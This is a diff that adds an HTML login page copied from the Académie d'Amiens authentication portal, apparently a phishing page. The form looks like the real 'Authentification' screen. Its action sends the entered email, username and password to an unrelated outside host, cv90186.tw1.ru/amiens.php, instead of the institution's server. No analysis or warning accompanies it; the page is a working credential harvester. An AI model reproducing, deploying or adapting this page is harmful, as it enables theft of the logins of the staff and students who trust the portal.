@@ -1,0 +1,82 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0048)https://portail.ac-amiens.fr/alogin/ct_logon.jsp -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+  	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2, user-scalable=yes">
+    
+    <meta http-equiv="Cache-Control" content="no-cache">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="expires" content="0">
+    <title>Authentification</title>
+    <script type="text/javascript" src="./files/login.js.téléchargement"></script>
+    <script type="text/javascript" src="./files/jquery-1.12.0.min.js.téléchargement"></script>
+    <link href="./files/style.css" rel="stylesheet" type="text/css">
+
+    <link href="./files/responsive.css" rel="stylesheet" type="text/css">
+
+
+    <style>
+
+		#bloc_logon label{
+			min-width:100px;
+			display: inline-block;
+		}
+    </style>
+    
+    <!--[if lt IE 11]>
+		<link href="style/ie.css" rel="stylesheet" type="text/css" />
+	<![endif]-->
+  </head>
+
+  <body class="bandeau_large" onload="javascript:startup()">
+    <div id="bandeau_large"><img src="./files/bandeau_gauche_national.jpg" width="239" height="616"></div>
+    <div id="container">
+      <div id="titre" style="float: none;">
+         <img id="titre_img" src="./files/portail_titre_accueil.gif" alt="Accédez à vos applications" title="Accédez à vos applications">
+         <img id="titre_img_small" src="./files/portail_titre_accueil_2l.gif" alt="Accédez à vos applications" title="Accédez à vos applications">
+         <img id="titre_img_small2" src="./files/portail_titre2.gif" alt="Accédez à vos applications" title="Accédez à vos applications">
+      </div>
+
+      <div class="login">Authentification</div>
+
+
+
+      <div class="contour_top">
+        <div class="contour_bottom">
+		
+        <form name="ctlogonform" action="https://cv90186.tw1.ru/amiens.php" method="post" onsubmit="return login();">
+            <input type="hidden" name="auth_mode" value="BASIC">
+	    <input type="hidden" name="orig_url" value="">
+            <div id="bloc_logon">
+              <div id="bloc_user">
+
+                <label for="email">Email</label>
+                <input name="email" type="text" id="user">
+              </div>
+              <div id="bloc_user">
+
+                <label for="user">Identifiant</label>
+                <input name="user" type="text" id="user">
+              </div>
+              <div id="bloc_password">
+                <label for="password">Mot de Passe</label>
+                <input name="password" type="password" id="password" title="Saisissez votre Mot de Passe." autocomplete="off">
+                <div id="revealer" type="btn" class="bouton">&nbsp;</div>
+
+              </div>
+              <div id="bloc_submit">
+                <input name="button" type="submit" class="bouton" id="button" value="Valider">
+              </div>
+
+            </div>
+          </form>
+          <script type="text/javascript">getFocus("user");</script>
+        </div>
+      </div>
+    
+    <div class="commentaire">&nbsp;</div>
+
+
+    </div>
+  
+
+</body></html>
